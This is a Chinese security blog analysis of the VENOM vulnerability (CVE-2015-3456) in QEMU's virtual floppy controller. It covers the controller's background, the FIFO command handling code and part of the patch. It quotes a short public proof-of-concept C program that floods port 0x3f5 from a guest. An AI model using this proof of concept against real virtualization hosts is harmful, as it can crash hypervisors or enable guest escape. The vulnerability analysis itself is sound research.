<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>VENOM “毒液”漏洞分析（qemu kvm CVE‐2015‐3456） - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="漏洞简介" />
<meta name="keywords" content="“毒液”漏洞,“毒液”漏洞分析,0x3F6,CrowdStrike,CVE-2015-3456,cyg07,DATA_FIFO,fdctrl_handle_readid,fdctrl_write_data,FIFO 0x3f5,Marcus Meissner,noirfate,progmboy,QEMU,qemu kvm CVE‐2015‐3456,VENOM,VENOM（CVE-2015-3456）,堆溢出漏洞,毒液,毒液VENOM,越界写操作,高危漏洞" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/6602.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-6602 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/system" rel="category tag">系统安全</a> &gt;  正文 </nav><article id="post-6602" class="post-6602 post type-post status-publish format-standard hentry category-system tag-2983 tag-2982 tag-2987 tag-crowdstrike tag-cve-2015-3456 tag-cyg07 tag-data_fifo tag-fdctrl_handle_readid tag-fdctrl_write_data tag-fifo-0x3f5 tag-marcus-meissner tag-noirfate tag-progmboy tag-qemu tag-qemu-kvm-cve20153456 tag-venom tag-venomcve-2015-3456 tag-2980 tag-2984 tag-2981 tag-2050">
	<header class="single-header">
		<h1>VENOM “毒液”漏洞分析（qemu kvm CVE‐2015‐3456）</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /5/15 13:22</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">1,577</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/6602.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<h2><strong>漏洞简介</strong></h2>
<p><span style="color: #339966;">CrowdStrike的Jason Geffner发现开源计算机仿真器QEMU中存在一个和虚拟软盘控制器相关的安全漏洞，代号VENOM，CVE编号为CVE-2015-3456。</span></p>
<p><span style="color: #ff0000;">利用此漏洞攻击者可以在有问题的虚拟机中进行逃逸,并且可以在宿主机中获得代码执行的权限。</span>更多详情见<a href="http://venom.crowdstrike.com/" target="_blank">作者博客</a>[1]</p>
<blockquote><p>         “VENOM（CVE-2015-3456）是一个存在于虚拟软盘驱动器（FDC）代码中的安全漏洞，该代码存在于许多计算机虚拟化平台之中。该漏洞可允许攻击者从受感染虚拟机中摆脱访客身份限制，并很有可能获取主机的代码执行权限。此外，攻击者还可以利用它访问主机系统以及主机上运行的所有虚拟机，并能够进行提升重要的访问权限，以使得攻击者可以访问主机的本地网络和相邻系统。”</p></blockquote>
<p>&nbsp;</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/VENOM.jpg"><img class="alignnone size-full wp-image-6612" src="http://www.secpulse.com/wp-content/uploads/2015/05/VENOM.jpg" alt="VENOM" width="900" height="505" /></a></p>
<h2>背景知识</h2>
<p>此漏洞位于qemu的虚拟软驱控制器的模拟代码中。下面介绍几个关于软驱的几个重要的地方。</p>
<p>&nbsp;</p>
<ul>
<li>控制寄存器</li>
</ul>
<p>软驱控制器是由9个寄存器进行控制的，这些寄存器可以通过端口0x3f0-0x3f7进行访问(0x3f6除外[2])。软驱控制器寄存器的定义如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_1.png"><img class="alignnone size-full wp-image-6603" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_1.png" alt="qemu_1" width="611" height="273" /></a></p>
<p>&nbsp;</p>
<p>漏洞相关的寄存器是DATA_FIFO。</p>
<p>&nbsp;</p>
<ul>
<li>MSR</li>
</ul>
<p>同时软驱控制器的MSR标记位表明当时软驱控制器的状态。此次漏洞相关的MSR标记位的定义如下表:</p>
<p>&nbsp;</p>
<p><img class="alignnone size-full wp-image-6608" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_21.png" alt="qemu_2" width="566" height="117" /></p>
<ul>
<li>FIFO命令</li>
</ul>
<p>命令是向DATA_FIFO写入的一个小于32的单字节的值，每个命令后面都要跟着一些指定长度的参数。命令的ID定义如下所示:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_3.png"><img class="alignnone size-full wp-image-6609" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_3.png" alt="qemu_3" width="616" height="701" /></a></p>
<p>&nbsp;</p>
<p>更多见<a href="http://wiki.osdev.org/Floppy_Disk_Controller" target="_blank">OSDev wiki</a>上的关于软驱控制器的文章</p>
<p>&nbsp;</p>
<h2>漏洞分析</h2>
<p>&nbsp;</p>
<h2>1.POC触发不了</h2>
<p>国外一名安全研究者Marcus Meissner发布了此漏洞poc如下:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_4.png"><img class="alignnone size-full wp-image-6611" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_4.png" alt="qemu_4" width="610" height="209" /></a></p>
<p>&nbsp;</p>
<pre class="theme:sublime-text lang:c decode:true ">#include &lt;sys/io.h&gt;
#define FIFO 0x3f5
int main() {
        int i;
        iopl(3);
        outb(0x0a,0x3f5); /* READ ID */
        for (i=0;i&lt;10000000;i++)
                outb(0x42,0x3f5); /* push */
}</pre>
<p>&nbsp;</p>
<p>我们可以看到,都是向DATA_FIFO端口写入数据，笔者拿到poc先在自己的机器上测试发现poc并不能触发，先不管原因，我们先来分析下qemu对FIFO命令的处理。</p>
<p>&nbsp;</p>
<h2>2.FIFO命令处理流程</h2>
<p>经过分析,我们可以得出其流程如下：首先qemu将FIFO的处理函数以及命令对应的参数个数等信息存放在一个表中,如下所示:</p>
<p>&nbsp;</p>
<pre class="theme:sublime-text lang:python decode:true">1.  static const struct {
2.      uint8_t value;
3.      uint8_t mask;
4.      const char* name;
5.      int parameters;
6.      void (*handler)(FDCtrl *fdctrl, int direction);
7.      int direction;
8.  } handlers[] = {
9.      { FD_CMD_READ, 0x1f, "READ", 8, fdctrl_start_transfer, FD_DI
R_READ },
10.      { FD_CMD_WRITE, 0x3f, "WRITE", 8, fdctrl_start_transfer, FD_DI
R_WRITE },
11.      { FD_CMD_SEEK, 0xff, "SEEK", 2, fdctrl_handle_seek },
12.      { FD_CMD_SENSE_INTERRUPT_STATUS, 0xff, "SENSE INTERRUPT STATU
S", 0, fdctrl_handle_sense_interrupt_status },
13.      { FD_CMD_RECALIBRATE, 0xff, "RECALIBRATE", 1, fdctrl_handle_re
calibrate },
14.      { FD_CMD_FORMAT_TRACK, 0xbf, "FORMAT TRACK", 5, fdctrl_handl
e_format_track },
15.      { FD_CMD_READ_TRACK, 0xbf, "READ TRACK", 8, fdctrl_start_trans
fer, FD_DIR_READ },
16.      { FD_CMD_RESTORE, 0xff, "RESTORE", 17, fdctrl_handle_restore
}, /* part of READ DELETED DATA */
17.      { FD_CMD_SAVE, 0xff, "SAVE", 0, fdctrl_handle_save }, /* part
of READ DELETED DATA */
18.      { FD_CMD_READ_DELETED, 0x1f, "READ DELETED DATA", 8, fdctrl_st
art_transfer_del, FD_DIR_READ },
19.      { FD_CMD_SCAN_EQUAL, 0x1f, "SCAN EQUAL", 8, fdctrl_start_trans
fer, FD_DIR_SCANE },
20.      { FD_CMD_VERIFY, 0x1f, "VERIFY", 8, fdctrl_start_transfer, F
D_DIR_VERIFY },
21.      { FD_CMD_SCAN_LOW_OR_EQUAL, 0x1f, "SCAN LOW OR EQUAL", 8, fdct
rl_start_transfer, FD_DIR_SCANL },
22.      { FD_CMD_SCAN_HIGH_OR_EQUAL, 0x1f, "SCAN HIGH OR EQUAL", 8, fd
ctrl_start_transfer, FD_DIR_SCANH },
23.      { FD_CMD_WRITE_DELETED, 0x3f, "WRITE DELETED DATA", 8, fdctr
l_start_transfer_del, FD_DIR_WRITE },
24.      { FD_CMD_READ_ID, 0xbf, "READ ID", 1, fdctrl_handle_readid },
25.      { FD_CMD_SPECIFY, 0xff, "SPECIFY", 2, fdctrl_handle_specify },
26.      { FD_CMD_SENSE_DRIVE_STATUS, 0xff, "SENSE DRIVE STATUS", 1, fd
ctrl_handle_sense_drive_status },
27.      { FD_CMD_PERPENDICULAR_MODE, 0xff, "PERPENDICULAR MODE", 1, fd
ctrl_handle_perpendicular_mode },
28.      { FD_CMD_CONFIGURE, 0xff, "CONFIGURE", 3, fdctrl_handle_config
ure },
29.      { FD_CMD_POWERDOWN_MODE, 0xff, "POWERDOWN MODE", 2, fdctrl_han
dle_powerdown_mode },
30.      { FD_CMD_OPTION, 0xff, "OPTION", 1, fdctrl_handle_option },
31.      { FD_CMD_DRIVE_SPECIFICATION_COMMAND, 0xff, "DRIVE SPECIFICATI
ON COMMAND", 5, fdctrl_handle_drive_specification_command },
32.      { FD_CMD_RELATIVE_SEEK_OUT, 0xff, "RELATIVE SEEK OUT", 2, fdct
rl_handle_relative_seek_out },
33.      { FD_CMD_FORMAT_AND_WRITE, 0xff, "FORMAT AND WRITE", 10, fdctr
l_unimplemented },
34.      { FD_CMD_RELATIVE_SEEK_IN, 0xff, "RELATIVE SEEK IN", 2, fdctr
l_handle_relative_seek_in },
35.      { FD_CMD_LOCK, 0x7f, "LOCK", 0, fdctrl_handle_lock },
36.      { FD_CMD_DUMPREG, 0xff, "DUMPREG", 0, fdctrl_handle_dumpreg },
37.      { FD_CMD_VERSION, 0xff, "VERSION", 0, fdctrl_handle_version },
38.      { FD_CMD_PART_ID, 0xff, "PART ID", 0, fdctrl_handle_partid },
39.      { FD_CMD_WRITE, 0x1f, "WRITE (BeOS)", 8, fdctrl_start_transfe
r, FD_DIR_WRITE }, /* not in specification ; BeOS 4.5 bug */
40.      { 0, 0, "unknown", 0, fdctrl_unimplemented }, /* default handl
er */
41.  };</pre>
<p>&nbsp;</p>
<p>&nbsp;</p>
<pre class="theme:sublime-text lang:python decode:true">1.  static void fdctrl_write_data(FDCtrl *fdctrl, uint32_t value)
2.  {
3.      ...
4.
5.      //
6.      // 这里对msr的状态进行检查.见背景知识中的msr一段.
7.      // 这里必须FD_MSR_RQM置位，就是说控制器已经准备好交换数据了
8.      // FD_MSR_DIO必须置0，说明控制器不能处在要被读的状态
9.      //
10.
11.      if (!(fdctrl‐&gt;msr &amp; FD_MSR_RQM) || (fdctrl‐&gt;msr &amp; FD_MSR_DIO))
{
12.          FLOPPY_DPRINTF("error: controller not ready for writin
g\n");
13.          return;
14.      }
15.
16.      //
17.      // 如果参数为0说明此次为命令字节。这里通过命令ID找到相应的
18.      // Handler.获取参数的个数
19.      //
20.
21.      if (fdctrl‐&gt;data_pos == 0) {
22.          pos = command_to_handler[value &amp; 0xff];
23.          FLOPPY_DPRINTF("%s command\n", handlers[pos].name);
24.
25.          //
26.          // 获取参数个数
27.          // +1是为了加上command id
28.          //
29.
30.          fdctrl‐&gt;data_len = handlers[pos].parameters + 1;
31.          fdctrl‐&gt;msr |= FD_MSR_CMDBUSY;
32.      }
33.      ...
34.
35.      //
36.      // 将传入字节保存到fdctrl‐&gt;fifo这个buffer中.
37.      //
38.
39.      fdctrl‐&gt;fifo[fdctrl‐&gt;data_pos++] = value;
40.
41.      //
42.      // 判断参数是否已经保存完成，如果参数保存完成就调用相应的处理函数
43.      //
44.
45.      if (fdctrl‐&gt;data_pos == fdctrl‐&gt;data_len) {
46.          pos = command_to_handler[fdctrl‐&gt;fifo[0] &amp; 0xff];
47.          (*handlers[pos].handler)(fdctrl, handlers[pos].direction);
48.      }
49.  }</pre>
<p>&nbsp;</p>
<p>在处理函数中如果有返回的数据。</p>
<p>控制器模拟代码则调用fdctrl_set_fifo这个函数来设置MSR的状态为FD_MSR_DIO,已表示控制器处在可被读状态。</p>
<p>注意：设置完以后控制器是不可读的见fdctrl_write_data开始的那个检查。</p>
<p>fdctrl_set_fifo代码如下：表的每一项都定义了相应命令的一些信息，这里我们将被一项称为一个Handler下同。</p>
<p>当qemu接收到FIFO命令之后，通过命令的ID找到这个命令的Handler，然后再根据这个Handler中保存的参数的个数来继续接收参数。并将命令ID和参数放在一个buffer中。在接受完参数后调用相应的处理函数。</p>
<p>整个FIFO写操作派发流程都是在函数fdctrl_write_data里。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_5.png"><img class="alignnone size-full wp-image-6613" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_5.png" alt="qemu_5" width="621" height="165" /></a></p>
<p>&nbsp;</p>
<p>如果没有要返回的数据或者返回的数据已经被客户机通过IN指令读取完了，则会调用fdctrl_reset_fifo来重置FIFO。</p>
<p>即将FIFO置为可写状态。fdctrl_reset_fifo：</p>
<p>&nbsp;</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_6.png"><img class="alignnone size-full wp-image-6614" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_6.png" alt="qemu_6" width="619" height="144" /></a></p>
<h2>3.为什么不能触发</h2>
<p>通过以上流程的分析，我们再来看Marcus Meissner公布的poc的流程：</p>
<p>首先发送一个id为0xa的控制命令。我们可以看到id为0xa的命令为FD_CMD_READ_ID,其对应的处理函数为fdctrl_handle_readid,参数个数为1个。</p>
<pre class="theme:sublime-text lang:c decode:true">{ FD_CMD_READ_ID, 0xbf, “READ ID”, 1, fdctrl_handle_readid },</pre>
<p>之后又会写入一个0x42作为READ_ID命令的参数。接下来进入到fdctrl_handle_readid函数内。经过笔者调试fdctrl_handle_readid这个函数启动了一个定时器。在定时器被触发的时候程序调用了fdctrl_set_fifo来生成返回数据。所以接下来的向FIFO写0x42的操作完全没有用，被fdctrl_write_data开始的fdctrl-&gt;msr &amp; FD_MSR_DIO这个检查给拦下了。所以这个poc在笔者的机器上并不能触发。</p>
<p>&nbsp;</p>
<h2>4.新的触发方式</h2>
<p>我们先来看下补丁的代码：</p>
<div class="line number1 index0 alt2"></div>
<pre class="theme:sublime-text lang:c decode:true">1.  ‐‐‐ a/hw/block/fdc.c
2.  +++ b/hw/block/fdc.c
3.  @@ ‐1497,7 +1497,7 @@ static uint32_t fdctrl_read_data(FDCtrl *fdc
trl)
4.   {
5.       FDrive *cur_drv;
6.       uint32_t retval = 0;
7.  ‐    int pos;
8.  +    uint32_t pos;
9.
10.       cur_drv = get_cur_drv(fdctrl);
11.       fdctrl‐&gt;dsr &amp;= ~FD_DSR_PWRDOWN;
12.  @@ ‐1506,8 +1506,8 @@ static uint32_t fdctrl_read_data(FDCtrl *fdc
trl)
13.           return 0;
14.       }
15.       pos = fdctrl‐&gt;data_pos;
16.  +    pos %= FD_SECTOR_LEN;
17.       if (fdctrl‐&gt;msr &amp; FD_MSR_NONDMA) {
18.  ‐        pos %= FD_SECTOR_LEN;
19.           if (pos == 0) {
20.               if (fdctrl‐&gt;data_pos != 0)
21.                   if (!fdctrl_seek_to_next_sect(fdctrl, cur_drv)) {
22.  @@ ‐1852,10 +1852,13 @@ static void fdctrl_handle_option(FDCtrl *f
dctrl, int direction)
23.   static void fdctrl_handle_drive_specification_command(FDCtrl *fdc
trl, int direction)
24.   {
25.       FDrive *cur_drv = get_cur_drv(fdctrl);
26.  +    uint32_t pos;
27.
